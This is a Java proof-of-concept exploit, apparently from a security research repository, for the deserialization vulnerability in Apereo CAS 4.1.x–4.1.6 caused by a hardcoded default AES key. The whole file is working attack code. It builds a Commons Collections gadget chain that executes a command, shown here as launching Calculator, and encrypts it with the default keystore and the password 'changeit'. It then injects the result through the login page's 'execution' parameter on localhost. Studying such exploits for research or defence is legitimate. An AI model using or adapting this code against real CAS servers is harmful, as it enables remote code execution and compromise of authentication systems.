/*
 * [业务问题]: CAS 4.1.x ~ 4.1.6 反序列化漏洞利用。
 * [实现逻辑]: 由于 CAS 在这些版本中使用了硬编码的 AES 密钥，攻击者可以构造恶意的加密 Webflow 状态（execution 参数），触发反序列化攻击。
 */
package com.security.bug.cas;

import com.security.bug.common.utils.HttpUtil;
import com.security.bug.common.utils.Reflections;
import com.security.bug.common.utils.TemplatesUtil;
import com.unboundid.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.net.URLEncoder;
import java.security.KeyStore;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.cryptacular.bean.BufferedBlockCipherBean;
import org.cryptacular.bean.CipherBean;
import org.cryptacular.bean.KeyStoreFactoryBean;
import org.cryptacular.generator.sp80038a.RBGNonce;
import org.cryptacular.io.URLResource;
import org.cryptacular.spec.BufferedBlockCipherSpec;
import org.jasig.spring.webflow.plugin.Transcoder;

/**
 * cas版本（4.1.x ~ 4.1.6）
 * 默认缺省固定 AES 密钥导致的漏洞验证。
 */
public class AttackDemo {

  public static void main(String[] args) throws Exception {
    byte[] bytes = new EncryptedTranscoder().encode(makeGadget());
    String base64 = Base64.encode(bytes);
    String html = HttpUtil.get("http://localhost:8080/cas/login");
    Matcher matcher = Pattern.compile("name=\"execution\" value=\"(.+?)\"").matcher(html);
    if (matcher.find()) {
      String execution = matcher.group(1);
      if (execution != null && execution.length() > 0) {
        String uuid = execution.split("_")[0];
        System.out.println(
            HttpUtil.post("http://localhost:8080/cas/login", "execution=" + uuid + "_" + URLEncoder.encode(base64)));
      }
    }
  }

  private static Object makeGadget() throws Exception {
    Object templates = TemplatesUtil
        .createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");

    // setup harmless chain
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

    // define the comparator used for sorting
    TransformingComparator comp = new TransformingComparator(transformer);

    // prepare CommonsCollections object entry point
    TreeBag tree = new TreeBag(comp);
    tree.add(templates);

    // arm transformer
    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
    return tree;
  }

  public static class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
      BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
      bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
      bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
      bufferedBlockCipherBean.setKeyAlias("aes128");
      bufferedBlockCipherBean.setKeyPassword("changeit");
      bufferedBlockCipherBean.setNonce(new RBGNonce());
      this.setCipherBean(bufferedBlockCipherBean);
    }

    public EncryptedTranscoder(CipherBean cipherBean) throws IOException {
      this.setCipherBean(cipherBean);
    }

    public void setCompression(boolean compression) {
      this.compression = compression;
    }

    protected void setCipherBean(CipherBean cipherBean) {
      this.cipherBean = cipherBean;
    }

    public byte[] encode(Object o) throws IOException {
      if (o == null) {
        return new byte[0];
      } else {
        ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
        ObjectOutputStream out = null;

        try {
          if (this.compression) {
            out = new ObjectOutputStream(new GZIPOutputStream(outBuffer));
          } else {
            out = new ObjectOutputStream(outBuffer);
          }

          out.writeObject(o);
        } finally {
          if (out != null) {
            out.close();
          }

        }

        try {
          return this.cipherBean.encrypt(outBuffer.toByteArray());
        } catch (Exception var7) {
          throw new IOException("Encryption error", var7);
        }
      }
    }

    public Object decode(byte[] encoded) throws IOException {
      byte[] data;
      try {
        data = this.cipherBean.decrypt(encoded);
      } catch (Exception var11) {
        throw new IOException("Decryption error", var11);
      }

      ByteArrayInputStream inBuffer = new ByteArrayInputStream(data);
      ObjectInputStream in = null;

      Object var5;
      try {
        if (this.compression) {
          in = new ObjectInputStream(new GZIPInputStream(inBuffer));
        } else {
          in = new ObjectInputStream(inBuffer);
        }

        var5 = in.readObject();
      } catch (ClassNotFoundException var10) {
        throw new IOException("Deserialization error", var10);
      } finally {
        if (in != null) {
          in.close();
        }

      }

      return var5;
    }

    protected KeyStore createAndPrepareKeyStore() {
      KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean();
      URL u = this.getClass().getResource("/etc/keystore.jceks");
      ksFactory.setResource(new URLResource(u));
      ksFactory.setType("JCEKS");
      ksFactory.setPassword("changeit");
      return ksFactory.newInstance();
    }
  }

}
